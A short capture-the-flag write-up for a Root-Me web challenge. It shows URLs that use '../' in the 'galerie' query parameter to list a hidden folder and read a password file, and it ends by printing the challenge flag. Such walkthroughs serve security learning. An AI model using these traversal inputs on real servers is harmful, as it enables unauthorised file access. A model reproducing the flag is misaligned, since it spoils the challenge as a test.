---
layout: default
title: Directory-traversal
---

Here we can go one step back in the url and see there is `galerie` folder, which gives us `403`, and also the `ch15.php`.

When we click something, it takes us for example to `http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps`.

Let's try and do some directory-traversal in the query param, for example, 
`http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps/../`

We can see there is `86hwnX2r` folder there, let's go there (this is the hidden folder in galerie I guess)

`http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps/../86hwnX2r`

We can see `password.txt`, so let's go to: `/galerie/86hwnX2r/password.txt`

`http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt`

And we get the password!

**Flag:** **_`kcb$!Bx@v4Gs9Ez`_**
